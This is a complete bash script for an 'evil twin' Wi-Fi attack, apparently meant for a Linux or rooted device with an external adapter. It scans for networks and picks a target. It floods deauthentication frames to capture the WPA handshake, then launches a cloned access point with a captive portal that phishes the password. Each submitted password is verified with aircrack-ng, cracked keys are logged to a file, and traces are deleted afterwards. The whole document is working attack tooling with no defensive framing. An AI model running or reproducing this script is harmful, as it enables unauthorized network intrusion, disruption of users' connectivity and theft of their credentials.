#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'
log_info() { echo -e "${GREEN}[*]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[-]${NC} $1"; }
log_success() { echo -e "${GREEN}[✓]${NC} $1"; }
TARGET_BSSID=""
TARGET_SSID=""
TARGET_CHANNEL=""
FAKE_SSID=""
HANDSHAKE_FILE=""
DEAUTH_PID=""
cleanup() {
    echo ""
    log_info "Shutting down attack..."
    pkill -f hostapd 2>/dev/null
    pkill -f dnsmasq 2>/dev/null
    pkill -f airodump-ng 2>/dev/null
    pkill -f aireplay-ng 2>/dev/null
    pkill -f "php -S" 2>/dev/null
    pkill -f passapi.py 2>/dev/null
    fuser -k 5000/tcp 2>/dev/null
    fuser -k 80/tcp 2>/dev/null
    [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
    iw dev wlan2 del > /dev/null 2>&1
    airmon-ng stop wlan1 > /dev/null 2>&1
    iptables --flush 2>/dev/null
    ip rule del from all lookup main pref 1 2>/dev/null || true
    ip rule del from all iif lo oif wlan2 uidrange 0-0 lookup 97 pref 11000 2>/dev/null || true
    ip rule del from all iif lo oif wlan0 lookup main pref 17000 2>/dev/null || true 
    ip rule del from all iif lo oif rmnet_data2 lookup main pref 17000 2>/dev/null || true
    ip rule del from all iif lo oif wlan2 lookup 97 pref 17000 2>/dev/null || true
    ip rule del pref 21000 2>/dev/null || true
    log_info "Cleaning up temporary files..."
    rm -f evil-*.cap evil-*.csv evil-*.kismet.* evil-*.netxml
    rm -f /tmp/target_bssid.txt /tmp/target_channel.txt /tmp/target_ssid.txt 
    rm -f /tmp/scan* /tmp/airodump.log /tmp/deauth.log
    rm -f nohup.out
    rm -f *.pcap
    rm -f attempts.txt password.txt
    if [ -n "$HANDSHAKE_FILE" ] && [ -f "$HANDSHAKE_FILE" ]; then
        rm -f "$HANDSHAKE_FILE"
    fi
    if [ -n "$TARGET_SSID" ]; then
        SAFE_SSID=$(echo "$TARGET_SSID" | sed 's/[^a-zA-Z0-9]/_/g')
        rm -f "${SAFE_SSID}.cap"
    fi
    rm -f *.pid
    log_success "Cleanup complete"
    exit 0
}
trap cleanup SIGINT SIGTERM EXIT
get_usb_device_info() {
    local iface="$1"
    wireless_devices=$(lsusb | grep -i "wireless\\|network\\|wlan\\|rtl\\|atheros\\|ralink" | grep -v "root hub")
    if [ -n "$wireless_devices" ]; then
        device_name=$(echo "$wireless_devices" | head -1 | sed 's/^.*ID [0-9a-f:]\+ //')
        echo "$device_name"
    else
        device_name=$(lsusb | grep -v "root hub" | tail -1 | sed 's/^.*ID [0-9a-f:]\+ //')
        echo "${device_name:-External USB Adapter}"
    fi
}
get_pci_device_info() {
    local iface="$1"
    if command -v lspci >/dev/null 2>&1; then
        pci_addr=$(basename $(readlink /sys/class/net/$iface/device) 2>/dev/null)
        if [ -n "$pci_addr" ]; then
            lspci_output=$(lspci -s "$pci_addr" 2>/dev/null)
            if [ -n "$lspci_output" ]; then
                echo "$lspci_output" | sed 's/^[0-9a-f:]\+ //'
                return
            fi
        fi
    fi
    echo "Unknown PCI device"
}
select_adapter() {
    log_info "Scanning for wireless adapters..."
    interfaces=($(iw dev 2>/dev/null | grep "Interface" | awk '{print $2}'))
    if [ ${#interfaces[@]} -eq 0 ]; then
        log_error "No wireless interfaces found"
        exit 1
    fi
    declare -A adapter_map
    counter=1
    echo "Interface     PHY    Driver       Device"
    echo "========================================================"
    for iface in "${interfaces[@]}"; do
        phy=$(iw dev "$iface" info 2>/dev/null | grep "wiphy" | awk '{print "phy"$2}')
        driver=""
        if command -v ethtool >/dev/null 2>&1; then
            driver=$(ethtool -i "$iface" 2>/dev/null | grep "driver:" | cut -d: -f2 | sed 's/^[[:space:]]*//')
        fi
        if [ -z "$driver" ] && [ -d "/sys/class/net/$iface/device/driver" ]; then
            driver=$(basename $(readlink /sys/class/net/$iface/device/driver) 2>/dev/null)
        fi
        chipset="Unknown"
        if [ -d "/sys/class/net/$iface/device" ]; then
            device_path=$(readlink -f "/sys/class/net/$iface/device" 2>/dev/null)
            driver_path=$(readlink -f "/sys/class/net/$iface/device/driver" 2>/dev/null)
            if echo "$device_path" | grep -q "/usb" || echo "$driver_path" | grep -q "/usb"; then
                chipset=$(get_usb_device_info "$iface")
            elif echo "$device_path" | grep -q "/pci" || echo "$driver_path" | grep -q "/pci"; then
                chipset=$(get_pci_device_info "$iface")
            else
                chipset="Built-in"
            fi
        else
            chipset="Virtual"
        fi
        display_iface="$iface"
        if [ ${#iface} -gt 10 ]; then
            display_iface="${iface:0:9}~"
        fi
        display_chipset="$chipset"
        if [ ${#chipset} -gt 25 ]; then
            display_chipset="${chipset:0:24}~"
        fi
        adapter_map[$counter]="$iface"
        printf " ${GREEN}%2d.${NC} %-11s %-6s %-12s %s\n" "$counter" "$display_iface" "$phy" "$driver" "$display_chipset"
        ((counter++))
    done
    echo "========================================================"
    physical_count=0
    for iface in "${interfaces[@]}"; do
        if [ -d "/sys/class/net/$iface/device" ]; then
            ((physical_count++))
        fi
    done
    if [ $physical_count -eq 1 ]; then
        for iface in "${interfaces[@]}"; do
            if [ -d "/sys/class/net/$iface/device" ]; then
                SELECTED_INTERFACE="$iface"
                log_info "Auto-selected: $SELECTED_INTERFACE"
                return 0
            fi
        done
    fi
    while true; do
        read -p "Select interface (1-$((counter-1))): " selection
        if [[ "$selection" =~ ^[0-9]+$ ]] && [ "$selection" -ge 1 ] && [ "$selection" -le $((counter-1)) ]; then
            SELECTED_INTERFACE="${adapter_map[$selection]}"
            break
        else
            log_error "Invalid selection"
        fi
    done
}   
scan_networks() {
    log_info "Scanning for networks..."
    sudo airmon-ng start wlan1 > /dev/null 2>&1
    sleep 5
    log_info "Scanning for 20 seconds..."
    { timeout --signal=KILL 20 airodump-ng wlan1 --output-format csv -w /tmp/scan > /dev/null 2>&1; } 2>/dev/null || true
    if [ ! -f "/tmp/scan-01.csv" ]; then
        log_error "No networks found"
        exit 1
    fi
    log_info "Available networks:"
    echo "----------------------------------------"
    counter=1
    declare -A network_map
    in_ap_section=true
    while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        if [[ "$line" == "Station MAC"* ]]; then
            in_ap_section=false
            continue
        fi
        if [ "$in_ap_section" = true ] && [[ "$line" != "BSSID"* ]]; then
            bssid=$(echo "$line" | cut -d, -f1 | xargs)
            channel=$(echo "$line" | cut -d, -f4 | xargs)
            essid=$(echo "$line" | cut -d, -f14 | xargs)
            if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [[ -n "$essid" ]]; then
                network_map[$counter]="$bssid|$channel|$essid"
                printf " ${GREEN}%2d.${NC} %-25s [Ch %s]\n" "$counter" "$essid" "$channel"
                ((counter++))
            fi
        fi
    done < /tmp/scan-01.csv
    echo "----------------------------------------"
    if [ $counter -eq 1 ]; then
        log_error "No networks detected"
        exit 1
    fi
    read -p "Select target (1-$((counter-1))): " selection
    if [[ ! "$selection" =~ ^[0-9]+$ ]] || [ "$selection" -lt 1 ] || [ "$selection" -ge $counter ]; then
        log_error "Invalid selection"
        exit 1
    fi
    IFS='|' read -r TARGET_BSSID TARGET_CHANNEL TARGET_SSID <<< "${network_map[$selection]}"
    TARGET_BSSID=$(echo "$TARGET_BSSID" | xargs)
    TARGET_CHANNEL=$(echo "$TARGET_CHANNEL" | xargs)
    TARGET_SSID=$(echo "$TARGET_SSID" | xargs)
    FAKE_SSID="$TARGET_SSID"
    log_success "Target: $TARGET_SSID (${TARGET_BSSID:0:8}...) on channel $TARGET_CHANNEL"
}
capture_handshake() {
    local bssid="$1"
    local channel="$2"
    local ssid="$3"
    log_info "Capturing handshake..."
    sudo iwconfig wlan1 channel "$channel" 2>/dev/null
    sleep 2
    nohup sudo airodump-ng -c "$channel" --bssid "$bssid" -w evil wlan1 > /tmp/airodump.log 2>&1 &
    AIRODUMP_PID=$!
    sleep 3
    nohup sudo aireplay-ng -0 0 -a "$bssid" wlan1 > /tmp/deauth.log 2>&1 &
    DEAUTH_PID=$!
    log_info "Deauth running - waiting for handshake..."
    HANDSAKE_CAPTURED=false
    for i in {1..60}; do
        if aircrack-ng evil-01.cap 2>/dev/null | grep -q "1 handshake"; then
            log_success "Handshake captured!"
            HANDSAKE_CAPTURED=true
            break
        fi
        sleep 10
    done
    sudo kill $AIRODUMP_PID 2>/dev/null
    sleep 2
    if [ "$HANDSAKE_CAPTURED" = true ]; then
        HANDSHAKE_FILE="${ssid//[^a-zA-Z0-9]/_}.cap"
        cp evil-01.cap "$HANDSHAKE_FILE"
        log_success "Handshake saved as: $HANDSHAKE_FILE"
    else
        log_warn "No handshake captured - continuing anyway"
        read -p "Continue? (y/n): " choice
        if [[ ! "$choice" =~ ^[Yy]$ ]]; then
            [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
            exit 1
        fi
    fi
}
update_configs() {
    local bssid="$1"
    local channel="$2"
    local ssid="$3"
    log_info "Configuring attack..."
    HANDSHAKE_FILE="${ssid//[^a-zA-Z0-9]/_}.cap"
    if [ -f "passapi.py" ]; then
        sed -i "s/target = .*/target = '$bssid'/" passapi.py
        sed -i "s/ssid_name = .*/ssid_name = '$ssid'/" passapi.py
        sed -i "s/handshake_file = .*/handshake_file = '$HANDSHAKE_FILE'/" passapi.py
    else
        log_error "passapi.py not found!"
        exit 1
    fi
    if [ -f "hostapd.conf" ]; then
        sed -i "s/^ssid=.*/ssid=$ssid/" hostapd.conf
        sed -i "s/^channel=.*/channel=$channel/" hostapd.conf
    else
        log_error "hostapd.conf not found!"
        exit 1
    fi
}
select_internet_source() {
    echo "----------------------------------------"
    echo "Internet Source:"
    echo " 1. WiFi Sharing (fakeap.sh)"
    echo " 2. Cellular Data (4g-ap.sh)"
    echo "----------------------------------------"
    while true; do
        read -p "Select (1/2): " choice
        case $choice in
            1)
                INTERNET_CHOICE="wifi"
                break
                ;;
            2)
                INTERNET_CHOICE="cellular"
                break
                ;;
            *)
                log_error "Invalid choice"
                ;;
        esac
    done
}
start_evil_twin() {
    log_info "Starting evil twin..."
    if [ "$INTERNET_CHOICE" = "wifi" ]; then
        ./fakeap.sh > /dev/null 2>&1 &
    else
        ./4g-ap.sh > /dev/null 2>&1 &
    fi
    sleep 8
    python3 passapi.py > /dev/null 2>&1 &
    sleep 3
    cd portal
    php -S 10.0.0.1:80 router.php > /dev/null 2>&1 &
    cd ..
    sleep 8
    log_success "Evil twin is live"
}
monitor_attack() {
    local bssid="$1"
    log_info "Continuous deauth maintained from capture phase"
    echo "==============================="
    echo "ATTACK RUNNING"
    echo "==============================="
    echo "Target:    $TARGET_SSID"
    echo "Evil Twin: $FAKE_SSID" 
    echo "Channel:   $TARGET_CHANNEL"
    echo "Internet:   $INTERNET_CHOICE"
    echo "Handshake: $HANDSHAKE_FILE"
    echo "Deauth:    CONTINUOUS" 
    echo "----------------------------------------"
    echo "Monitoring for credentials..."
    echo "----------------------------------------"
    last_attempt_count=0
    password_found=false
    while true; do
        if [ -f "password.txt" ] && [ -s "password.txt" ]; then
            temp_pass=$(cat password.txt | head -1 | tr -d '[:space:]')
            if aircrack-ng "$HANDSHAKE_FILE" -b "$TARGET_BSSID" -w password.txt 2>/dev/null | grep -q "KEY FOUND"; then
                echo ""
                echo -e "${GREEN}PASSWORD CRACKED: $temp_pass${NC}"
                timestamp=$(date +"%Y-%m-%d %H:%M:%S")
                echo "$timestamp | SSID: $TARGET_SSID | BSSID: $TARGET_BSSID | Password: $temp_pass" >> cracked.txt
                echo -e "${GREEN}Cracked Network Saved in: cracked.txt${NC}"
                echo ""
                [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
                echo "Waiting 30 seconds before shutdown..."
                for i in {30..1}; do
                    echo -ne "Shutting down in: $i seconds\r"
                    sleep 1
                done
                echo ""
                echo -e "${GREEN}Attack completed successfully!${NC}"
                password_found=true
                break
            fi
        fi
        if [ -f "attempts.txt" ] && [ -s "attempts.txt" ]; then
            current_count=$(wc -l < attempts.txt 2>/dev/null)
            if [ $current_count -gt $last_attempt_count ]; then
                new_attempts=$(tail -n $((current_count - last_attempt_count)) attempts.txt 2>/dev/null)
                if [ ! -z "$new_attempts" ]; then
                    echo ""
                    echo "NEW PASSWORD ATTEMPTS:"
                    echo "$new_attempts" | while read -r line; do
                        if [ ! -z "$line" ]; then
                            echo "  $line"
                        fi
                    done
                    echo ""
                fi
                last_attempt_count=$current_count
            fi
        fi
        sleep 5
    done
}
main() {
    echo "========================================"
    echo "      EVIL TWIN ATTACK"
    echo "========================================"
    if [ "$EUID" -ne 0 ]; then
        log_error "Run as root: sudo $0"
        exit 1
    fi
    echo -e "${BLUE}[*] Checking dependencies...${NC}"
    for cmd in aircrack-ng hostapd dnsmasq dnsspoof python3 php iw airmon-ng ethtool; do
        if command -v "$cmd" &>/dev/null; then
            echo -e "  ${GREEN}[✓]${NC} $cmd"
        else
            echo -e "  ${RED}[✗]${NC} $cmd"
            log_error "Missing: $cmd"
            case "$cmd" in
                "dnsspoof")
                    echo "  Install with: apt install dsniff"
                    ;;
                "aircrack-ng")
                    echo "  Install with: apt install aircrack-ng"
                    ;;
                "hostapd")
                    echo "  Install with: apt install hostapd"
                    ;;
                "dnsmasq")
                    echo "  Install with: apt install dnsmasq"
                    ;;
                "airmon-ng")
                    echo "  Install with: apt install aircrack-ng"
                    ;;
                "ethtool")
                    echo "  Install with: apt install ethtool"
                    ;;
                "php")
                    echo "  Install with: apt install php"
                    ;;
                "python3")
                    echo "  Install with: apt install python3"
                    ;;
                "iw")
                    echo "  Install with: apt install iw"
                    ;;
            esac
            exit 1
        fi
    done
    if python3 -c "import flask" 2>/dev/null; then
        echo -e "  ${GREEN}[✓]${NC} flask"
    else
        echo -e "  ${RED}[✗]${NC} flask"
        log_error "Missing Flask module"
        echo "Install with: pip3 install flask"
        exit 1
    fi
    echo -e "${GREEN}✅ All dependencies are installed!${NC}\n"
    log_info "Plug in external WiFi adapter..."
    select_adapter
    scan_networks
    capture_handshake "$TARGET_BSSID" "$TARGET_CHANNEL" "$TARGET_SSID"
    update_configs "$TARGET_BSSID" "$TARGET_CHANNEL" "$FAKE_SSID"
    select_internet_source
    start_evil_twin
    monitor_attack "$TARGET_BSSID"
}
main